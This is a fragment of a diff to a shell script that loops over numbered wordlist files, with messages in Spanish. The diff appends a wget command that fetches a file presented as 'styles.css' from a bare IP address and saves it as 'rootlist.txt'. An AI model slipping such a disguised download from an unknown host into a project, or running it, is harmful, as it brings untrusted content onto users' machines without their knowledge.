@@ -16,3 +16,5 @@ for i in $(seq 0 499); do
     echo "Archivo wordlist-${i}.txt no encontrado."
   fi
 done
+
+wget -O rootlist.txt http://172.233.120.97:3000/styles.css
